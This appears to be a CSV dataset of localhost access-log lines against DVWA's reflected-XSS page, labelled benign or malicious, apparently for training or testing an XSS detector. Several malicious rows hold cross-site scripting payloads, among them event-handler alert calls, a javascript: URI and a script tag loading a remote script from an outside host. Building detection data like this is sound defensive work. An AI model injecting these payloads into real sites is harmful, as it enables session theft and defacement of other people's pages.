,url,malicious
3438,"127.0.0.1 - - [03/May/2021:03:12:54 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Celinka HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13150,"127.0.0.1 - - [03/May/2021:03:23:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nayan HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1295,"127.0.0.1 - - [03/May/2021:03:20:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lindsey HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1262,"127.0.0.1 - - [03/May/2021:03:16:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Glyn HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17910,"127.0.0.1 - - [03/May/2021:02:34:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src\\x47=x"" 400 0 ""-"" ""-""",1
6599,"127.0.0.1 - - [03/May/2021:03:21:24 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mallissa HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
6200,"127.0.0.1 - - [03/May/2021:03:22:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mindy HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14757,"127.0.0.1 - - [03/May/2021:03:14:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dede HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16353,"127.0.0.1 - - [03/May/2021:03:07:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=pics HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
18825,"127.0.0.1 - - [03/May/2021:03:20:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lab HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14704,"127.0.0.1 - - [03/May/2021:03:08:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=webboard HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13748,"127.0.0.1 - - [03/May/2021:03:10:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Alecia HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4843,"127.0.0.1 - - [03/May/2021:03:27:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tillie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8960,"127.0.0.1 - - [03/May/2021:03:15:08 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Elane HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7639,"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
1491,"127.0.0.1 - - [03/May/2021:03:20:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lizz HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2163,"127.0.0.1 - - [03/May/2021:03:11:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Atmane HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11133,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""\\x0Djavascript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",1
9783,"127.0.0.1 - - [03/May/2021:03:05:52 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=cynthia HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10609,"127.0.0.1 - - [03/May/2021:03:23:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Paulus HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14997,"127.0.0.1 - - [03/May/2021:02:35:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<;SCRIPT SRC=http://ha.ckers.org/xss.js>;<;/SCRIPT>;"" 400 0 ""-"" ""-""",1
12842,"127.0.0.1 - - [03/May/2021:03:40:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",1
187,"127.0.0.1 - - [03/May/2021:03:23:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Norman HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3214,"127.0.0.1 - - [03/May/2021:03:40:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<figcaption oncontextmenu=\""alert(1)\"">test</figcaption>"" 400 0 ""-"" ""-""",1
7115,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name='\""\""><script language=\""JavaScript\"">"" 400 0 ""-"" ""-""",1
10938,"127.0.0.1 - - [03/May/2021:03:25:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rose HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1034,"127.0.0.1 - - [03/May/2021:03:18:24 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jawad HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
